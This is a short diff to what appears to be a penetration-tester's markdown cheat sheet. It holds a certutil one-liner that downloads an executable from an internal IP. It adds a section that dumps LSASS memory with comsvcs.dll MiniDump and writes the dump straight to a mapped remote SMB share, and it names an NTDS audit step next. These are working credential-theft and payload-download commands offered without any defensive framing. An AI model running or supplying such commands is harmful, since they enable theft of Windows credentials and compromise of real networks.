@@ -10,6 +10,13 @@ tags: notes
 
 `certutil.exe -urlcache -split -f http://172.16.10.1/obfs.exe`
 
+LSASS dump without touching disk
+
+```
+net use x: \\mysmbserver\c$\
+powershell -c rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).id x:\lassdump.bin full
+```
+
 NTDS audit 
 
 ```
